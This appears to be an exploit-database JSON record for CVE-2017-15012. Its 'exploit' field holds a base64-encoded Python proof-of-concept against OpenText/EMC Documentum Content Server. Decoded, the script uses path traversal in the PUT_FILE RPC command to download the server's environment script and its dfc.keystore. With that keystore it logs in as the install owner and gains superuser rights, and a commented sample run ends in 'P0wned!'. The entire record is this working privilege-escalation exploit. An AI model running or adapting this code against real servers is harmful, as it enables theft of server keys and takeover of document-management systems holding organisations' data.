{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCiMgT3BlbnRleHQgRG9jdW1lbnR1bSBDb250ZW50IFNlcnZlciAoZm9ybWVybHkga25vd24gYXMgRU1DIERvY3VtZW50dW0gQ29udGVudCBTZXJ2ZXIpDQojIGRvZXMgbm90IHByb3Blcmx5IHZhbGlkYXRlIGlucHV0IG9mIFBVVF9GSUxFIFJQQy1jb21tYW5kIHdoaWNoIGFsbG93cyBhbnkNCiMgYXV0aGVudGljYXRlZCB1c2VyIHRvIGhpamFjayBhcmJpdHJhcnkgZmlsZSBmcm9tIENvbnRlbnQgU2VydmVyIGZpbGVzeXN0ZW0sDQojIGJlY2F1c2Ugc29tZSBmaWxlcyBvbiBDb250ZW50IFNlcnZlciBmaWxlc3lzdGVtIGFyZSBzZWN1cml0eS1zZW5zaXRpdmUNCiMgdGhlIHNlY3VyaXR5IGZsYXcgZGVzY3JpYmVkIGFib3ZlIGxlYWRzIHRvIHByaXZpbGVnZSBlc2NhbGF0aW9uDQojDQojIFRoZSBQb0MgYmVsb3cgZGVtb25zdHJhdGVzIHRoaXMgdnVsbmVyYWJpbGl0eToNCiMNCiMgTWFjQm9vay1Qcm86fiAkIHB5dGhvbiBDVkUtMjAxNy0xNTAxMi5weQ0KIyB1c2FnZToNCiMgQ1ZFLTIwMTctMTUwMTIucHkgaG9zdCBwb3J0IHVzZXIgcGFzc3dvcmQNCiMgTWFjQm9vay1Qcm86fiAkIHB5dGhvbiBDVkUtMjAxNy0xNTAxMi5weSBkb2N1NzJkZXYwMSAxMDAwMSBkbV9ib2ZfcmVnaXN0cnkgZG1fYm9mX3JlZ2lzdHJ5DQojIFRyeWluZyB0byBjb25uZWN0IHRvIGRvY3U3MmRldjAxOjEwMDAxIGFzIGRtX2JvZl9yZWdpc3RyeSAuLi4NCiMgQ29ubmVjdGVkIHRvIGRvY3U3MmRldjAxOjEwMDAxLCBkb2NiYXNlOiBEQ1RNX0RFViwgdmVyc2lvbjogNy4yLjAyNzAuMDM3NyAgTGludXg2NC5PcmFjbGUNCiMgRG93bmxvYWRpbmcgL3UwMS9kb2N1bWVudHVtL2NzL3Byb2R1Y3QvNy4yL2Jpbi9kbV9zZXRfc2VydmVyX2Vudi5zaA0KIyBUcnlpbmcgdG8gZmluZCBhbnkgb2JqZWN0IHdpdGggY29udGVudC4uLg0KIyAgICAgRG93bmxvYWRpbmcgL3UwMS9kb2N1bWVudHVtL2NzL3NoYXJlZC9jb25maWcvZGZjLmtleXN0b3JlDQojIFRyeWluZyB0byBmaW5kIGFueSBvYmplY3Qgd2l0aCBjb250ZW50Li4uDQojICAgICBUcnlpbmcgdG8gY29ubmVjdCB0byBkb2N1NzJkZXYwMToxMDAwMSBhcyBkbWFkbWluIC4uLg0KIyBDb25uZWN0ZWQgdG8gZG9jdTcyZGV2MDE6MTAwMDEsIGRvY2Jhc2U6IERDVE1fREVWLCB2ZXJzaW9uOiA3LjIuMDI3MC4wMzc3ICBMaW51eDY0Lk9yYWNsZQ0KIyBQMHduZWQhDQojDQojDQoNCmltcG9ydCBzb2NrZXQNCmltcG9ydCBzeXMNCmZyb20gb3MucGF0aCBpbXBvcnQgYmFzZW5hbWUNCg0KZnJvbSBkY3RtcHkuZG9jYmFzZWNsaWVudCBpbXBvcnQgRG9jYmFzZUNsaWVudCwgTlVMTF9JRA0KZnJvbSBkY3RtcHkuaWRlbnRpdHkgaW1wb3J0IElkZW50aXR5DQpmcm9tIGRjdG1weS5vYmoudHlwZWRvYmplY3QgaW1wb3J0IFR5cGVkT2JqZWN0DQoNCkNJUEhFUlMgPSAiQUxMOmFOVUxMOiFlTlVMTCINCg0KDQpkZWYgdXNhZ2UoKToNCiAgICBwcmludCAidXNhZ2U6XG5cdCVzIGhvc3QgcG9ydCB1c2VyIHBhc3N3b3JkIiAlIGJhc2VuYW1lKHN5cy5hcmd2WzBdKQ0KDQoNCmRlZiBtYWluKCk6DQogICAgaWYgbGVuKHN5cy5hcmd2KSAhPSA1Og0KICAgICAgICB1c2FnZSgpDQogICAgICAgIGV4aXQoMSkNCg0KICAgIChzZXNzaW9uLCBkb2NiYXNlKSA9IGNyZWF0ZV9zZXNzaW9uKCpzeXMuYXJndlsxOjVdKQ0KDQogICAgaWYgaXNfc3VwZXJfdXNlcihzZXNzaW9uKToNCiAgICAgICAgcHJpbnQgIkN1cnJlbnQgdXNlciBpcyBhIHN1cGVydXNlciwgbm90aGluZyB0byBkbyINCiAgICAgICAgZXhpdCgxKQ0KDQogICAgYWRtaW5fY29uc29sZSA9IHNlc3Npb24uZ2V0X2J5X3F1YWxpZmljYXRpb24oDQogICAgICAgICJkbV9tZXRob2Qgd2hlcmUgb2JqZWN0X25hbWU9J2RtX0pNU0FkbWluQ29uc29sZSciKQ0KICAgIGVudl9zY3JpcHQgPSBhZG1pbl9jb25zb2xlWydtZXRob2RfdmVyYiddDQogICAgZW52X3NjcmlwdCA9IGVudl9zY3JpcHQucmVwbGFjZSgnZG1fam1zX2FkbWluLnNoJywgJ2RtX3NldF9zZXJ2ZXJfZW52LnNoJykNCg0KICAgIGtleXN0b3JlX3BhdGggPSBOb25lDQogICAgc2NyaXB0ID0gc3RyKGRvd25sb2FkKHNlc3Npb24sIGVudl9zY3JpcHQsIGJ5dGVhcnJheSgpKSkNCiAgICBpZiBub3Qgc2NyaXB0Og0KICAgICAgICBwcmludCAiVW5hYmxlIHRvIGRvd25sb2FkIGRtX3NldF9zZXJ2ZXJfZW52LnNoIg0KICAgICAgICBleGl0KDEpDQoNCiAgICBmb3IgbCBpbiBzY3JpcHQuc3BsaXRsaW5lcygpOg0KICAgICAgICBpZiBub3QgbC5zdGFydHN3aXRoKCJET0NVTUVOVFVNX1NIQVJFRCIpOg0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAga2V5c3RvcmVfcGF0aCA9IGwuc3BsaXQoJz0nKVsxXQ0KICAgICAgICBicmVhaw0KDQogICAgaWYgbm90IGtleXN0b3JlX3BhdGg6DQogICAgICAgIHByaW50ICJVbmFibGUgdG8gZGV0ZXJtaW5lIERPQ1VNRU5UVU1fU0hBUkVEIg0KICAgICAgICBleGl0KDEpDQoNCiAgICBrZXlzdG9yZV9wYXRoICs9ICIvY29uZmlnL2RmYy5rZXlzdG9yZSINCiAgICBrZXlzdG9yZSA9IHN0cihkb3dubG9hZChzZXNzaW9uLCBrZXlzdG9yZV9wYXRoLCBieXRlYXJyYXkoKSkpDQoNCiAgICBpZiBub3Qga2V5c3RvcmU6DQogICAgICAgIHByaW50ICJVbmFibGUgdG8gZG93bmxvYWQgZGZjLmtleXN0b3JlIg0KICAgICAgICBleGl0KDEpDQoNCiAgICAoc2Vzc2lvbiwgZG9jYmFzZSkgPSBjcmVhdGVfc2Vzc2lvbigNCiAgICAgICAgc3lzLmFyZ3ZbMV0sIHN5cy5hcmd2WzJdLA0KICAgICAgICBzZXNzaW9uLnNlcnZlcmNvbmZpZ1sncl9pbnN0YWxsX293bmVyJ10sICIiLA0KICAgICAgICBpZGVudGl0eT1JZGVudGl0eSh0cnVzdGVkPVRydWUsIGtleXN0b3JlPWtleXN0b3JlKSkNCiAgICBpZiBpc19zdXBlcl91c2VyKHNlc3Npb24pOg0KICAgICAgICBwcmludCAiUDB3bmVkISINCg0KDQpkZWYgZG93bmxvYWQoc2Vzc2lvbiwgcGF0aCwgYnVmKToNCiAgICBwcmludCAiRG93bmxvYWRpbmcgJXMiICUgcGF0aA0KICAgIHByaW50ICJUcnlpbmcgdG8gZmluZCBhbnkgb2JqZWN0IHdpdGggY29udGVudC4uLiINCiAgICBvYmplY3RfaWQgPSBzZXNzaW9uLnF1ZXJ5KA0KICAgICAgICAiU0VMRUNUIEZPUiBSRUFEIHJfb2JqZWN0X2lkICINCiAgICAgICAgIkZST00gZG1fc3lzb2JqZWN0IFdIRVJFIHJfY29udGVudF9zaXplPjAiKSBcDQogICAgICAgIC5uZXh0X3JlY29yZCgpWydyX29iamVjdF9pZCddDQoNCiAgICBzZXNzaW9uLmFwcGx5KE5vbmUsIE5VTExfSUQsICJCRUdJTl9UUkFOUyIpDQogICAgc3RvcmUgPSBzZXNzaW9uLmdldF9ieV9xdWFsaWZpY2F0aW9uKCJkbV9maWxlc3RvcmUiKQ0KICAgIGZvcm1hdCA9IHNlc3Npb24uZ2V0X2J5X3F1YWxpZmljYXRpb24oImRtX2Zvcm1hdCIpDQogICAgcmVtb3RlX3BhdGggPSAiY29tbW9uPS8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLiVzPURpcmVjdG9yeSIgJSBwYXRoDQogICAgcmVzdWx0ID0gc2Vzc2lvbi5wdXRfZmlsZShzdG9yZS5vYmplY3RfaWQoKSwgcmVtb3RlX3BhdGgsIGZvcm1hdC5vYmplY3RfaWQoKSkNCiAgICBmdWxsX3NpemUgPSByZXN1bHRbJ0ZVTExfQ09OVEVOVF9TSVpFJ10NCiAgICB0aWNrZXQgPSByZXN1bHRbJ0RfVElDS0VUJ10NCg0KICAgIGNvbnRlbnRfaWQgPSBzZXNzaW9uLm5leHRfaWQoMHgwNikNCiAgICBvYmogPSBUeXBlZE9iamVjdChzZXNzaW9uPXNlc3Npb24pDQogICAgb2JqLnNldF9zdHJpbmcoIk9CSkVDVF9UWVBFIiwgImRtcl9jb250ZW50IikNCiAgICBvYmouc2V0X2Jvb2woIklTX05FV19PQkpFQ1QiLCBUcnVlKQ0KICAgIG9iai5zZXRfaW50KCJpX3ZzdGFtcCIsIDApDQogICAgb2JqLnNldF9pZCgic3RvcmFnZV9pZCIsIHN0b3JlLm9iamVjdF9pZCgpKQ0KICAgIG9iai5zZXRfaWQoImZvcm1hdCIsIGZvcm1hdC5vYmplY3RfaWQoKSkNCiAgICBvYmouc2V0X2ludCgiZGF0YV90aWNrZXQiLCB0aWNrZXQpDQogICAgb2JqLnNldF9pZCgicGFyZW50X2lkIiwgb2JqZWN0X2lkKQ0KICAgIGlmIG5vdCBzZXNzaW9uLnNhdmVfY29udF9hdHRycyhjb250ZW50X2lkLCBvYmopOg0KICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIlVuYWJsZSB0byBzYXZlIGNvbnRlbnQgb2JqZWN0IikNCg0KICAgIGhhbmRsZSA9IHNlc3Npb24ubWFrZV9wdWxsZXIoDQogICAgICAgIE5VTExfSUQsIHN0b3JlLm9iamVjdF9pZCgpLCBjb250ZW50X2lkLA0KICAgICAgICBmb3JtYXQub2JqZWN0X2lkKCksIHRpY2tldA0KICAgICkNCg0KICAgIGlmIGhhbmRsZSA9PSAwOg0KICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIlVuYWJsZSBtYWtlIHB1bGxlciIpDQoNCiAgICBmb3IgY2h1bmsgaW4gc2Vzc2lvbi5kb3dubG9hZChoYW5kbGUpOg0KICAgICAgICBidWYuZXh0ZW5kKGNodW5rKQ0KDQogICAgcmV0dXJuIGJ1Zg0KDQoNCmRlZiBjcmVhdGVfc2Vzc2lvbihob3N0LCBwb3J0LCB1c2VyLCBwd2QsIGlkZW50aXR5PU5vbmUpOg0KICAgIHByaW50ICJUcnlpbmcgdG8gY29ubmVjdCB0byAlczolcyBhcyAlcyAuLi4iICUgXA0KICAgICAgICAgIChob3N0LCBwb3J0LCB1c2VyKQ0KICAgIHNlc3Npb24gPSBOb25lDQogICAgdHJ5Og0KICAgICAgICBzZXNzaW9uID0gRG9jYmFzZUNsaWVudCgNCiAgICAgICAgICAgIGhvc3Q9aG9zdCwgcG9ydD1pbnQocG9ydCksDQogICAgICAgICAgICB1c2VybmFtZT11c2VyLCBwYXNzd29yZD1wd2QsDQogICAgICAgICAgICBpZGVudGl0eT1pZGVudGl0eSkNCiAgICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgICAgICBpZiBlLmVycm5vID09IDU0Og0KICAgICAgICAgICAgc2Vzc2lvbiA9IERvY2Jhc2VDbGllbnQoDQogICAgICAgICAgICAgICAgaG9zdD1ob3N0LCBwb3J0PWludChwb3J0KSwNCiAgICAgICAgICAgICAgICB1c2VybmFtZT11c2VyLCBwYXNzd29yZD1wd2QsDQogICAgICAgICAgICAgICAgaWRlbnRpdHk9aWRlbnRpdHksDQogICAgICAgICAgICAgICAgc2VjdXJlPVRydWUsIGNpcGhlcnM9Q0lQSEVSUykNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHJhaXNlIGUNCiAgICBkb2NiYXNlID0gc2Vzc2lvbi5kb2NiYXNlY29uZmlnWydvYmplY3RfbmFtZSddDQogICAgdmVyc2lvbiA9IHNlc3Npb24uc2VydmVyY29uZmlnWydyX3NlcnZlcl92ZXJzaW9uJ10NCiAgICBwcmludCAiQ29ubmVjdGVkIHRvICVzOiVzLCBkb2NiYXNlOiAlcywgdmVyc2lvbjogJXMiICUgXA0KICAgICAgICAgIChob3N0LCBwb3J0LCBkb2NiYXNlLCB2ZXJzaW9uKQ0KICAgIHJldHVybiAoc2Vzc2lvbiwgZG9jYmFzZSkNCg0KDQpkZWYgaXNfc3VwZXJfdXNlcihzZXNzaW9uKToNCiAgICB1c2VyID0gc2Vzc2lvbi5nZXRfYnlfcXVhbGlmaWNhdGlvbigNCiAgICAgICAgImRtX3VzZXIgV0hFUkUgdXNlcl9uYW1lPVVTRVIiKQ0KICAgIGlmIHVzZXJbJ3VzZXJfcHJpdmlsZWdlcyddID09IDE2Og0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIGdyb3VwID0gc2Vzc2lvbi5nZXRfYnlfcXVhbGlmaWNhdGlvbigNCiAgICAgICAgImRtX2dyb3VwIHdoZXJlIGdyb3VwX25hbWU9J2RtX3N1cGVydXNlcnMnICINCiAgICAgICAgIkFORCBhbnkgaV9hbGxfdXNlcnNfbmFtZXM9VVNFUiIpDQogICAgaWYgZ3JvdXAgaXMgbm90IE5vbmU6DQogICAgICAgIHJldHVybiBUcnVlDQoNCiAgICByZXR1cm4gRmFsc2UNCg0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIG1haW4oKQ0K", 
    "filename": "platforms/multiple/webapps/43003.py", 
    "id": "43003", 
    "cves": [
        "CVE-2017-15012"
    ]
}